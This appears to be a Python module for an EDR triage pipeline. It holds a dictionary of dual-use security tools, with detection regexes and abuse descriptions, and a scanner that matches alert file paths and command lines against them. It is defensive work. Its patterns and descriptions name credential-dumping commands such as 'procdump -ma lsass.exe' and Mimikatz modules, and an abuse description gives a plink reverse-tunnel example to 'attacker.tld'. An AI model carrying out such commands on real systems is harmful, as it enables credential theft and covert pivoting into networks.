"""Dual-use security/research tool dictionary and scanner.

Many EDR detections fire on the *behavior* of well-known security research
or red-team tools — but the alert just calls it "suspicious .NET load" or
"unusual PowerShell execution" without naming the tool. An analyst seeing
"powershell loaded NDesk.Options.dll from \\OneDrive\\…\\NtObjectManager\\2.0.1"
won't recognize NtObjectManager unless they happen to know what it is.

This module maintains a curated dictionary of well-known dual-use tools and
provides a scanner that runs over file paths (and optionally a cmdline) from
a CrowdStrike alert payload, returning a list of detected tools with:

  - the tool's name and author
  - what it's legitimately used for
  - what attackers typically use it for
  - what an analyst should look at next IF it turns out to be malicious

The scanner is intentionally substring-based and case-insensitive — many of
these tools are renamed/repackaged at runtime, so we want to catch them by
folder/module patterns and well-known DLL/EXE names rather than by hash.
False positives here are tolerable (an analyst seeing "PsExec detected" can
disposition it in seconds); false negatives are not.

Categories of tools tracked:
  - Windows internals research (NtObjectManager, PSReflect)
  - AD/identity recon (SharpHound, BloodHound, AdFind, PowerView)
  - Credential abuse (Mimikatz, Rubeus, Kekeo, SafetyKatz, LaZagne)
  - Lateral movement (Impacket, CrackMapExec/NetExec, PsExec)
  - C2 frameworks (Cobalt Strike, Empire, Sliver)
  - Network recon (Nmap, Responder, MITM6)
  - Memory dumping / forensics tools repurposed offensively (ProcDump)
  - Tunneling / pivot tools (Chisel, Ngrok, Plink)
"""

from __future__ import annotations

import re
from typing import Any, Dict, List, Optional


# ---------------------------------------------------------------------------
# The dictionary
# ---------------------------------------------------------------------------
#
# Each entry is a dict with these fields:
#   name             : human-readable tool name
#   author           : author / project / vendor (for analyst context)
#   category         : grouping (research / recon / credential / lateral / c2 / network / pivot)
#   path_substrings  : case-insensitive substrings to match against full file paths
#   filename_regex   : list of regex patterns matched against the filename only (case-insensitive)
#   cmdline_regex    : list of regex patterns matched against the trigger cmdline (case-insensitive)
#   legitimate_use   : 1-2 sentence description of legitimate use cases
#   common_abuse     : 1-2 sentence description of typical malicious use
#   if_malicious_next: pivot suggestions if this turns out to be malicious

KNOWN_DUAL_USE_TOOLS: List[Dict[str, Any]] = [
    # ---- Windows internals research ----
    {
        "name": "NtObjectManager",
        "author": "James Forshaw (Google Project Zero)",
        "category": "research",
        # Path substrings — case-insensitive component matches against the
        # lowercased filepath. The match is anchored to a path-separator or
        # end-of-string boundary by _path_contains_component(), so e.g.
        # `\\ntobjectmanager` matches `\\ntobjectmanager\\foo` AND
        # `...\\ntobjectmanager` but NOT `\\ntobjectmanagersomething`.
        "path_substrings": ["\\ntobjectmanager", "/ntobjectmanager"],
        "filename_regex": [
            r"^ntobjectmanager(\.psd1|\.psm1|\.dll)$",
            r"^ndesk\.options\.dll$",
            r"^about_(ntobjectmanager|managingntobjectlifetime)",
        ],
        "cmdline_regex": [r"\bntobjectmanager\b", r"\bget-nt[a-z]+\b", r"\bnew-nt[a-z]+\b"],
        "legitimate_use": "PowerShell module for inspecting and manipulating Windows NT object manager — used by Windows internals researchers, sandbox analysts, and security engineers. Legitimately installed from PowerShell Gallery.",
        "common_abuse": "Token manipulation, sandbox escape, reflective payload loading via direct NT syscalls. Loaded by red teams during privilege escalation and AD recon.",
        "if_malicious_next": "Check for subsequent NtCreateToken / NtImpersonateThread / NtOpenProcessToken activity, suspicious access to LSASS, and reflective payload loads from non-standard paths.",
    },
    {
        "name": "PSReflect",
        "author": "Matt Graeber / Mattifestation",
        "category": "research",
        "path_substrings": ["\\psreflect", "/psreflect"],
        "filename_regex": [r"^psreflect(\.psm1|\.ps1)$"],
        "cmdline_regex": [r"\bpsreflect\b", r"\bnew-inmemorymodule\b"],
        "legitimate_use": "PowerShell helper for defining .NET reflection types and calling unmanaged Win32 APIs. Used by researchers and red teamers.",
        "common_abuse": "Foundation library for many offensive PowerShell tools (PowerSploit, PowerView, Empire). Almost never seen in benign scripts.",
        "if_malicious_next": "Look for downstream PowerSploit / Empire / PowerView module loads, in-memory .NET assembly loads, suspicious P/Invoke calls.",
    },

    # ---- AD/identity recon ----
    {
        "name": "SharpHound",
        "author": "SpecterOps",
        "category": "recon",
        "path_substrings": ["\\sharphound", "/sharphound"],
        "filename_regex": [r"^sharphound(\.exe|\.ps1)$"],
        "cmdline_regex": [r"\bsharphound\b", r"\binvoke-bloodhound\b"],
        "legitimate_use": "BloodHound's data collector — runs AD/LDAP enumeration to map attack paths. Run by AD admins and pentesters during sanctioned engagements.",
        "common_abuse": "Standard AD recon tool for almost every red team engagement and ransomware operator. Output (zip of JSON files) gets ingested into BloodHound.",
        "if_malicious_next": "Check for `*.zip` writes containing JSON, large LDAP query bursts to DCs, and follow-on lateral movement attempts to high-value AD objects (Tier-0 admins, DCs).",
    },
    {
        "name": "BloodHound",
        "author": "SpecterOps",
        "category": "recon",
        "path_substrings": ["\\bloodhound", "/bloodhound"],
        "filename_regex": [r"^bloodhound(\.exe)?$"],
        "cmdline_regex": [r"\bbloodhound(?!\.zip)\b"],
        "legitimate_use": "AD attack-path visualization tool — UI consumer of SharpHound output. Used by red teams, internal AD security teams, and IR consultants.",
        "common_abuse": "When run on a workstation that isn't an admin's, it's a strong recon signal — analyzing AD attack paths against the environment.",
        "if_malicious_next": "Pull `SharpHound` collector output from the same host, look for queries against high-privilege groups (Domain Admins, Tier-0).",
    },
    {
        "name": "AdFind",
        "author": "Joe Richards",
        "category": "recon",
        "path_substrings": [],
        "filename_regex": [r"^adfind(\.exe)?$"],
        "cmdline_regex": [r"\badfind\b"],
        "legitimate_use": "Lightweight LDAP query tool — used by AD admins for ad-hoc queries and scripting. Free standalone .exe.",
        "common_abuse": "Top-3 most-abused recon tool for ransomware operators (Conti, Ryuk, BlackCat all use it). Bulk-enumerates users, groups, computers, GPOs.",
        "if_malicious_next": "Check the cmdline for `-f`/`-t`/`-list` flags, output redirection to files/shares, and follow-on lateral movement based on enumeration results.",
    },
    {
        "name": "PowerView",
        "author": "PowerSploit project (Will Schroeder)",
        "category": "recon",
        "path_substrings": ["\\powerview", "/powerview", "\\powersploit\\recon", "/powersploit/recon"],
        "filename_regex": [r"^powerview\.ps1$"],
        "cmdline_regex": [
            r"\bpowerview\b",
            # Word-prefix matches: \bget-net followed by any of the suffixes
            # plus more word chars (handles `Get-NetDomainComputer` whose suffix
            # `Domain` is followed by `Computer` with no word boundary).
            r"\bget-net(domain|user|computer|group|loggedon|session)\w*",
            r"\bget-domain(computer|user|group|controller|admins?)\w*",
            r"\binvoke-userhunter\b",
            r"\bfind-localadminaccess\b",
        ],
        "legitimate_use": "Offensive PowerShell module for AD recon — part of PowerSploit. Sometimes used by AD admins who like its ergonomics.",
        "common_abuse": "Standard PowerShell-based AD enumeration. Heavily used by red teams and APT groups for environment mapping.",
        "if_malicious_next": "Look for cmdlets like Invoke-UserHunter, Find-LocalAdminAccess, Get-DomainController; bulk LDAP queries from a non-admin workstation.",
    },

    # ---- Credential abuse ----
    {
        "name": "Mimikatz",
        "author": "Benjamin Delpy (gentilkiwi)",
        "category": "credential",
        "path_substrings": ["\\mimikatz", "/mimikatz"],
        "filename_regex": [r"^mimikatz(\.exe)?$", r"^mimilib\.dll$", r"^mimilove(\.exe)?$", r"^mimidrv\.sys$"],
        "cmdline_regex": [
            r"\bmimikatz\b",
            r"\bsekurlsa::",
            r"\blsadump::",
            r"\bkerberos::",
            r"\bcrypto::",
            r"\bprivilege::debug\b",
        ],
        "legitimate_use": "Almost none in production environments. Occasionally used by IR/forensics teams during sanctioned engagements with explicit approval.",
        "common_abuse": "The credential-dumping tool. Extracts plaintext passwords, hashes, Kerberos tickets, and certificates from LSASS. Used in nearly every credential theft incident.",
        "if_malicious_next": "Treat as confirmed malicious unless you have an active IR engagement signed off in writing. Pull LSASS access events, verify host containment, rotate any credentials that may have been resident on the host.",
    },
    {
        "name": "Rubeus",
        "author": "Will Schroeder (SpecterOps)",
        "category": "credential",
        "path_substrings": ["\\rubeus", "/rubeus"],
        "filename_regex": [r"^rubeus(\.exe)?$"],
        "cmdline_regex": [
            r"\brubeus\b",
            r"\b(asktgt|asktgs|s4u|kerberoast|asreproast|tgtdeleg|monitor|ptt|tickets)\b",
        ],
        "legitimate_use": "Kerberos abuse / research tool. Used by red teams for ticket manipulation, AS-REP roasting, Kerberoasting, S4U abuse.",
        "common_abuse": "Standard Kerberos attack toolkit. Steals/forges tickets, performs delegation abuse, dumps service account hashes.",
        "if_malicious_next": "Pull Windows event logs 4768/4769/4624 for the host, look for unusual TGT/TGS requests, check for Kerberoasting against service accounts with weak passwords.",
    },
    {
        "name": "SafetyKatz",
        "author": "Will Schroeder",
        "category": "credential",
        "path_substrings": ["\\safetykatz", "/safetykatz"],
        "filename_regex": [r"^safetykatz(\.exe)?$"],
        "cmdline_regex": [r"\bsafetykatz\b"],
        "legitimate_use": "None — this is a Mimikatz wrapper designed specifically to evade EDR detection by injecting Mimikatz into a known process.",
        "common_abuse": "Mimikatz with extra evasion. Treat the same as Mimikatz.",
        "if_malicious_next": "Same as Mimikatz — confirmed malicious unless signed-off engagement, verify containment, rotate creds.",
    },
    {
        "name": "Kekeo",
        "author": "Benjamin Delpy",
        "category": "credential",
        "path_substrings": ["\\kekeo", "/kekeo"],
        "filename_regex": [r"^kekeo(\.exe)?$"],
        "cmdline_regex": [r"\bkekeo\b", r"\btgs::"],
        "legitimate_use": "Mimikatz cousin focused on Kerberos protocol abuse. No legitimate enterprise use.",
        "common_abuse": "Kerberos delegation abuse, golden/silver tickets, ticket forgery.",
        "if_malicious_next": "Treat as confirmed malicious. Same response as Mimikatz/Rubeus.",
    },
    {
        "name": "LaZagne",
        "author": "AlessandroZ",
        "category": "credential",
        "path_substrings": ["\\lazagne", "/lazagne"],
        "filename_regex": [r"^lazagne(\.exe|\.py)?$"],
        "cmdline_regex": [r"\blazagne\b"],
        "legitimate_use": "Open-source credential recovery tool — extracts saved passwords from browsers, mail clients, Wi-Fi, etc. Sometimes used by IT for password recovery.",
        "common_abuse": "Bulk credential harvesting on a compromised host. Common in ransomware playbooks.",
        "if_malicious_next": "Check for browser/mail/credential store access events, files written containing extracted creds, and exfil channel from the host.",
    },

    # ---- Lateral movement ----
    {
        "name": "Impacket",
        "author": "Fortra / SecureAuth Labs",
        "category": "lateral",
        "path_substrings": ["\\impacket", "/impacket"],
        "filename_regex": [
            r"^(psexec|smbexec|wmiexec|atexec|dcomexec)\.py$",
            r"^secretsdump\.py$",
            r"^mssqlclient\.py$",
            r"^gettgt\.py$",
            r"^getuserspns\.py$",
            r"^ntlmrelayx\.py$",
            r"^smbserver\.py$",
        ],
        "cmdline_regex": [r"\bimpacket\b"],
        "legitimate_use": "Python library of network protocol implementations. Used by pentesters for AD attacks, by IR teams for forensic data collection, and by red teams during engagements.",
        "common_abuse": "Backbone of post-exploitation toolkits. `psexec.py` / `wmiexec.py` for lateral movement, `secretsdump.py` for DC credential extraction, `ntlmrelayx.py` for relay attacks.",
        "if_malicious_next": "Pull SMB/RPC auth events on the target hosts, check for SYSTEM-level cmd execution, and look for follow-on credential dumping or lateral movement.",
    },
    {
        "name": "CrackMapExec / NetExec",
        "author": "byt3bl33d3r / Pennyw0rth",
        "category": "lateral",
        "path_substrings": ["\\crackmapexec", "/crackmapexec", "\\netexec", "/netexec"],
        "filename_regex": [r"^(crackmapexec|cme|nxc|netexec)(\.exe|\.py)?$"],
        "cmdline_regex": [r"\b(crackmapexec|netexec|nxc|cme)\b"],
        "legitimate_use": "Pentesting swiss army knife — auth spraying, SMB/WinRM/MSSQL/RDP enumeration, lateral execution. Standard pentest tool.",
        "common_abuse": "Same capabilities, used for unauthorized recon and lateral movement.",
        "if_malicious_next": "Pull failed-then-successful auth events (spray pattern), look for follow-on SMB lateral execution, and check the source host for credentials in clear-text/scripts.",
    },
    {
        "name": "PsExec (Sysinternals)",
        "author": "Mark Russinovich (Sysinternals/Microsoft)",
        "category": "lateral",
        "path_substrings": ["\\psexec", "/psexec", "\\sysinternals", "/sysinternals"],
        "filename_regex": [r"^psexec(64)?(\.exe)?$", r"^psexesvc(\.exe)?$"],
        "cmdline_regex": [r"\bpsexec\b", r"\bpsexec64\b"],
        "legitimate_use": "Microsoft Sysinternals remote-execution tool — widely used by sysadmins for ad-hoc remote command execution. Legitimate but high-risk.",
        "common_abuse": "Standard lateral movement vehicle for nearly every ransomware operator. Drops `psexesvc.exe` on the target and runs commands as SYSTEM.",
        "if_malicious_next": "Check the target for `psexesvc.exe` service installs (event 7045), confirm whether the runner is in a known admin group, and look for follow-on payload execution.",
    },
    {
        "name": "ProcDump (Sysinternals)",
        "author": "Mark Russinovich (Sysinternals/Microsoft)",
        "category": "credential",
        "path_substrings": ["\\procdump", "/procdump"],
        "filename_regex": [r"^procdump(64)?(\.exe)?$"],
        "cmdline_regex": [r"\bprocdump(64)?\b.*\b(lsass|chrome|firefox|outlook)\b"],
        "legitimate_use": "Microsoft Sysinternals memory-dump tool — used by developers for crash analysis, IT for diagnostics. Signed Microsoft binary.",
        "common_abuse": "When pointed at LSASS (`procdump -ma lsass.exe`), extracts a memory dump that can be parsed offline by Mimikatz to recover credentials. Bypasses many EDR LSASS-protection paths.",
        "if_malicious_next": "Check the cmdline target — if it's lsass.exe, treat as credential theft. Look for the resulting `.dmp` file write and any exfil. Rotate creds resident on the host.",
    },

    # ---- C2 frameworks ----
    {
        "name": "Cobalt Strike (artifacts)",
        "author": "Fortra (formerly Strategic Cyber)",
        "category": "c2",
        "path_substrings": ["\\cobaltstrike", "/cobaltstrike"],
        "filename_regex": [
            r"^(beacon|artifact|teamserver)\.(exe|dll|ps1|jar|cna)$",
            r"^cobaltstrike(\.jar)?$",
        ],
        "cmdline_regex": [r"\bbeacon\.(exe|dll)\b", r"\bteamserver\b"],
        "legitimate_use": "Commercial red team / adversary simulation framework. Used by sanctioned red teams.",
        "common_abuse": "The most-used commercial C2 in incidents — stolen/cracked beacons are baseline tradecraft for ransomware affiliates and APT groups.",
        "if_malicious_next": "Pull network connections from the host to identify the C2 channel (often port 443/80 with jittered jitter and Malleable C2 profiles), check for in-memory beacon injection, and verify whether a legitimate red team engagement is active.",
    },
    {
        "name": "Empire / PowerShell Empire",
        "author": "PowerShellEmpire / BC-SECURITY",
        "category": "c2",
        "path_substrings": ["\\empire", "/empire"],
        "filename_regex": [r"^empire(\.exe|\.ps1)?$"],
        "cmdline_regex": [r"\bempire\b", r"\binvoke-empire\b"],
        "legitimate_use": "Open-source PowerShell post-exploitation C2 framework. Used by red teams.",
        "common_abuse": "Same. Less common now than Cobalt Strike but still seen in opportunistic attacks and CTFs.",
        "if_malicious_next": "Look for the agent's HTTP callbacks, in-memory PowerShell loads, and the standard Empire Invoke-* cmdlets in command history.",
    },
    {
        "name": "Sliver",
        "author": "Bishop Fox",
        "category": "c2",
        "path_substrings": ["\\sliver", "/sliver"],
        "filename_regex": [r"^sliver(\.exe)?$"],
        "cmdline_regex": [r"\bsliver\b"],
        "legitimate_use": "Open-source Go-based C2 framework — used by red teams as a Cobalt Strike alternative.",
        "common_abuse": "Same capabilities, increasingly seen in opportunistic intrusions as Cobalt Strike has gotten harder to use unsigned.",
        "if_malicious_next": "Check for outbound connections to mTLS / DNS / HTTP / WireGuard listeners, look for the Sliver implant's process injection patterns.",
    },

    # ---- Network recon ----
    {
        "name": "Nmap",
        "author": "Gordon Lyon",
        "category": "network",
        "path_substrings": ["\\nmap", "/nmap"],
        "filename_regex": [r"^nmap(\.exe)?$", r"^ncat(\.exe)?$"],
        "cmdline_regex": [r"\bnmap\b"],
        "legitimate_use": "The standard port scanner / network mapper. Used by network teams, pentesters, and security engineers daily.",
        "common_abuse": "Internal network reconnaissance, scanning for vulnerable services after initial access. The presence of nmap on a workstation that isn't a security team member's is a recon signal.",
        "if_malicious_next": "Pull the cmdline for target subnets, port lists, and timing. Check whether the runner is in security/network ops. Look for follow-on connections to discovered services.",
    },
    {
        "name": "Responder",
        "author": "lgandx (SpiderLabs)",
        "category": "network",
        "path_substrings": ["\\responder", "/responder"],
        "filename_regex": [r"^responder(\.py)?$"],
        "cmdline_regex": [r"\bresponder\.py\b"],
        "legitimate_use": "LLMNR/NBT-NS/mDNS poisoner used by pentesters to capture hashes from misconfigured workstations. No legitimate IT use.",
        "common_abuse": "Captures NetNTLM hashes during AD credential harvesting; common opening move in internal pentest playbooks.",
        "if_malicious_next": "Check for follow-on hash cracking attempts (offline), pass-the-hash, or relay attacks (ntlmrelayx). Hashes captured should be considered exposed.",
    },
    {
        "name": "MITM6",
        "author": "Fox-IT",
        "category": "network",
        "path_substrings": ["\\mitm6", "/mitm6"],
        "filename_regex": [r"^mitm6(\.py)?$"],
        "cmdline_regex": [r"\bmitm6\b"],
        "legitimate_use": "IPv6 DHCPv6 spoofing tool used by pentesters to redirect WPAD/DNS traffic. No legitimate IT use.",
        "common_abuse": "Standard internal pentest opening move when LLMNR is locked down — pivots to IPv6.",
        "if_malicious_next": "Pull DHCPv6 events on adjacent hosts, check for ntlmrelayx running on the same source host, and look for hashes captured downstream.",
    },

    # ---- Pivot / tunnel ----
    {
        "name": "Chisel",
        "author": "jpillora",
        "category": "pivot",
        "path_substrings": ["\\chisel", "/chisel"],
        "filename_regex": [r"^chisel(\.exe)?$"],
        "cmdline_regex": [r"\bchisel\b"],
        "legitimate_use": "Lightweight Go-based TCP tunnel over HTTP. Sometimes used by remote-work / dev teams for service access. Otherwise no business in a corporate environment.",
        "common_abuse": "Standard pivot tool for red teams — punches outbound HTTPS to a C2 / staging host, exposes internal services back through the tunnel.",
        "if_malicious_next": "Pull the cmdline for client/server flags and target host, look for outbound connections to non-corporate domains, and check for tunneled service access.",
    },
    {
        "name": "Ngrok",
        "author": "ngrok",
        "category": "pivot",
        "path_substrings": ["\\ngrok", "/ngrok"],
        "filename_regex": [r"^ngrok(\.exe)?$"],
        "cmdline_regex": [r"\bngrok\b"],
        "legitimate_use": "Commercial reverse-tunnel SaaS — used by developers to expose local web servers for testing. Generally policy-violating in production.",
        "common_abuse": "Quick way for an attacker (or insider) to expose internal services to the public internet through ngrok's hosted endpoints.",
        "if_malicious_next": "Pull the cmdline for the exposed local port, check for ngrok callbacks to *.ngrok.io / *.ngrok.app, and look for inbound traffic to internal services.",
    },
    {
        "name": "Plink (PuTTY)",
        "author": "Simon Tatham",
        "category": "pivot",
        "path_substrings": ["\\putty", "/putty"],
        "filename_regex": [r"^plink(\.exe)?$"],
        "cmdline_regex": [r"\bplink\b.*-(R|L|D)\b"],
        "legitimate_use": "PuTTY's command-line SSH client. Legitimately used for SSH access to Linux/network gear. Only flagged here when invoked with port-forwarding flags (`-L`/`-R`/`-D`).",
        "common_abuse": "SSH port forwarding (`plink -R 4444:localhost:3389 attacker.tld`) is a classic pivot/exfil technique that doesn't require dropping new tools.",
        "if_malicious_next": "Pull the cmdline for the remote SSH host and forwarding spec, check for outbound SSH (port 22) to non-corporate destinations, and look for inbound traffic on the forwarded port.",
    },
]


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

# Pre-compile regexes for speed.
_COMPILED_FILENAME_PATTERNS: Dict[str, List[re.Pattern]] = {}
_COMPILED_CMDLINE_PATTERNS: Dict[str, List[re.Pattern]] = {}

for _entry in KNOWN_DUAL_USE_TOOLS:
    _name = _entry["name"]
    _COMPILED_FILENAME_PATTERNS[_name] = [
        re.compile(p, re.IGNORECASE) for p in _entry.get("filename_regex", [])
    ]
    _COMPILED_CMDLINE_PATTERNS[_name] = [
        re.compile(p, re.IGNORECASE) for p in _entry.get("cmdline_regex", [])
    ]


def _path_contains_component(path_lc: str, needle_lc: str) -> bool:
    """Check whether `needle_lc` appears in `path_lc` as a complete path
    component (i.e. followed by a path separator or end-of-string).

    This is the substring test with anti-false-positive guardrails: we want
    `\\ntobjectmanager` to match `\\ntobjectmanager\\anything` AND
    `\\ntobjectmanager` (end of path), but NOT `\\ntobjectmanagersomething`
    or `\\NtObjectManager.dll` (the latter is the filename_regex's job).
    """
    if not needle_lc or not path_lc:
        return False
    idx = 0
    while True:
        hit = path_lc.find(needle_lc, idx)
        if hit == -1:
            return False
        end = hit + len(needle_lc)
        # Must be followed by a path separator or end-of-string
        if end == len(path_lc) or path_lc[end] in ("\\", "/"):
            return True
        idx = hit + 1


def _match_path(entry: Dict[str, Any], filepath: str, filename: str) -> Optional[str]:
    """Check whether a single (filepath, filename) matches a tool entry.

    Returns the matched evidence string, or None if no match.
    """
    if not (filepath or filename):
        return None
    fp_lc = filepath.lower()
    fn_lc = filename.lower()

    # Path component match (highest signal — folder/module patterns)
    for sub in entry.get("path_substrings", []):
        if _path_contains_component(fp_lc, sub.lower()):
            return f"path: {filepath}"

    # Filename regex match
    for pat in _COMPILED_FILENAME_PATTERNS.get(entry["name"], []):
        if pat.search(fn_lc):
            return f"filename: {filename}  (path: {filepath})" if filepath else f"filename: {filename}"

    return None


def _match_cmdline(entry: Dict[str, Any], cmdline: str) -> Optional[str]:
    """Check whether a cmdline matches a tool entry. Returns matched substring or None."""
    if not cmdline:
        return None
    for pat in _COMPILED_CMDLINE_PATTERNS.get(entry["name"], []):
        m = pat.search(cmdline)
        if m:
            return f"cmdline: {m.group(0)}"
    return None


def scan_for_dual_use_tools(
    files: Optional[List[Dict[str, str]]] = None,
    cmdline: str = "",
    extra_cmdlines: Optional[List[str]] = None,
) -> List[Dict[str, Any]]:
    """Scan files and cmdlines against the known dual-use tool dictionary.

    Args:
        files: List of {filename, filepath} dicts (e.g. from
               files_accessed_of_interest + files_written_of_interest).
        cmdline: The trigger process cmdline.
        extra_cmdlines: Additional cmdlines to scan (e.g. parent / grandparent).

    Returns:
        List of detected tool dicts. Each entry contains the tool's metadata
        (name, author, category, descriptions) plus an `evidence` list of
        strings showing what matched. Tools are deduped — a single tool
        matched by multiple files appears once with all evidence collated.
        Empty list if nothing matches.
    """
    files = files or []
    extra_cmdlines = extra_cmdlines or []

    # name -> {tool_entry, evidence: [str, ...]}
    detected: Dict[str, Dict[str, Any]] = {}

    def _record(entry: Dict[str, Any], evidence: str) -> None:
        name = entry["name"]
        if name not in detected:
            detected[name] = {
                "name": name,
                "author": entry.get("author", ""),
                "category": entry.get("category", ""),
                "legitimate_use": entry.get("legitimate_use", ""),
                "common_abuse": entry.get("common_abuse", ""),
                "if_malicious_next": entry.get("if_malicious_next", ""),
                "evidence": [],
            }
        if evidence not in detected[name]["evidence"]:
            detected[name]["evidence"].append(evidence)

    # Path/filename matches
    for f in files:
        fp = f.get("filepath", "") or ""
        fn = f.get("filename", "") or ""
        for entry in KNOWN_DUAL_USE_TOOLS:
            ev = _match_path(entry, fp, fn)
            if ev:
                _record(entry, ev)

    # Cmdline matches (trigger + any extras)
    all_cmdlines = [cmdline] + extra_cmdlines
    for cl in all_cmdlines:
        if not cl:
            continue
        for entry in KNOWN_DUAL_USE_TOOLS:
            ev = _match_cmdline(entry, cl)
            if ev:
                _record(entry, ev)

    # Cap evidence per tool to avoid noise — 5 should be enough for context
    for tool in detected.values():
        if len(tool["evidence"]) > 5:
            extra = len(tool["evidence"]) - 5
            tool["evidence"] = tool["evidence"][:5] + [f"... and {extra} more"]

    return list(detected.values())
